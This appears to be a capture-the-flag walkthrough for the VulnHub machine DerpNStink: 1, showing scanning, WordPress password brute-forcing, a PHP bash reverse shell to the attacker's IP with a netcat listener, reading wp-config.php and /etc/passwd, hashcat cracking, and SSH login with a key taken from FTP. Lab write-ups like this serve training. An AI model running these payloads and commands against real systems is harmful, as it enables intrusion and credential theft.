# DerpNStink: 1

- **Machine:** DerpNStink: 1
- **Download:** https://www.vulnhub.com/entry/derpnstink-1,221/

![](778-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](778-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.247
```

![](778-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.247
```

```bash
nmap -sC -sV -A 192.168.2.247
```

---

## HTTP Enumeration

This command performs an aggressive scan and uses the `http-enum` NSE script to identify interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.247
```

![](778-4.png)

---

# Web Enumeration

Visit the target website:

- http://192.168.2.247/

---

## Directory Enumeration

Perform directory brute-forcing using Dirsearch.

```bash
dirsearch -u http://192.168.2.247
```

![](778-5.png)

---

## Interesting Endpoints

Visit the following URLs:

- http://192.168.2.247/robots.txt
- http://192.168.2.247/weblog/wp-login.php
- http://192.168.2.247/php/phpmyadmin/

---

## Configure the Hosts File

Add the virtual host entry.

```bash
nano /etc/hosts
```

![](778-6.png)

Visit the virtual host:

- http://derpnstink.local/weblog/
- http://derpnstink.local/weblog/wp-login.php

---

## Enumerate WordPress Users

```bash
wpscan --url http://derpnstink.local/weblog -e u
```

![](778-7.png)

---

## Password Attack (Lab)

> **Lab note:** The following password attack is performed only against the authorized VulnHub practice machine.

```bash
wpscan --url http://derpnstink.local/weblog --usernames admin --passwords /opt/rockyou.txt
```

![](778-8.png)

### Valid Credentials

```text
Username : admin
Password : admin
```

Login to:

- http://derpnstink.local/weblog/wp-login.php

---

# Reverse Shell (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

## Create a PHP Reverse Shell

```bash
nano reverse_shell.php
```

Add the following payload:

```php
<?php
`/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'`;
?>
```

---

## Upload the Shell

Navigate to:

```text
Slideshow → Manage Slides
```

![](778-9.png)

Click **Edit** and upload the PHP shell.

---

## Start a Listener

```bash
nc -nlvp 443
```

---

## Trigger the Shell

Upload and execute the PHP payload.

![](778-10.png)

A reverse shell is successfully established.

![](778-11.png)

---

## Enumerate the WordPress Directory

Navigate to the WordPress installation.

```bash
cd /var/www/html/weblog
```

```bash
ls
```

![](778-12.png)

---

## Read the WordPress Configuration

```bash
cat wp-config.php
```

![](778-13.png)

### Database Credentials

```text
DB_NAME     = wordpress
DB_USER     = root
DB_PASSWORD = mysql
DB_HOST     = localhost
```

---

## Access phpMyAdmin

Login using the recovered database credentials.

![](778-14.png)

Navigate to:

```text
wordpress → wp_users
```

![](778-15.png)

### User Information

```text
User : unclestinky
Hash : $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
```

---

## Identify the Password Hash

```bash
hashid '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41'
```

Save the hash.

```bash
echo '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41' > hash.txt
```

![](778-16.png)

---

## Crack the Password Hash

```bash
hashcat -m 400 hash.txt /opt/rockyou.txt
```

![](778-17.png)

---

## Enumerate Local Users

```bash
cat /etc/passwd
```

![](778-18.png)

### Users Found

```text
stinky
mrderp
```

---

# FTP Enumeration

## Connect to FTP

```bash
ftp 192.168.2.247
```

![](778-19.png)

---

## Explore the FTP Directories

```bash
cd /files/ssh/ssh/ssh/ssh/ssh/ssh/ssh
```

```bash
ls
```

![](778-20.png)

---

## Download the SSH Key

```bash
get key.txt
```

![](778-21.png)

![](778-22.png)

---

# SSH Access

## Verify the Private Key

```bash
ssh-keygen -lf key.txt
```

```bash
head -1 key.txt
```

![](778-23.png)

---

## Set File Permissions

```bash
chmod 600 key.txt
```

---

## SSH Login

Authenticate using the downloaded private key.

```bash
ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa -i key.txt stinky@192.168.2.247
```

![](778-24.png)

Successful SSH access is obtained.

---

# Impact

- WordPress credentials were recovered through password attacks.
- Authenticated WordPress access allowed file upload and remote code execution.
- Database credentials were exposed in `wp-config.php`.
- Password hashes were extracted from the WordPress database.
- Sensitive SSH private keys were exposed via FTP.
- Private key authentication resulted in SSH access.

---

# Key Learning

- Always enumerate virtual hosts and hidden directories.
- WordPress configuration files often contain sensitive database credentials.
- Password hashes extracted from CMS databases should be analyzed and cracked where appropriate.
- FTP services may expose sensitive files such as SSH keys.
- Sensitive files should never be publicly accessible.
- Combine findings from multiple services (HTTP, FTP, MySQL, and SSH) to achieve deeper access.

---

# Summary

The assessment began with web enumeration, revealing a WordPress installation protected by weak credentials. After authenticating to the administrative interface, a PHP reverse shell was uploaded to obtain remote code execution. The WordPress configuration file exposed database credentials, which allowed access to phpMyAdmin and the extraction of password hashes. Further enumeration identified an exposed FTP service containing an SSH private key, which was successfully used to gain authenticated SSH access to the target machine.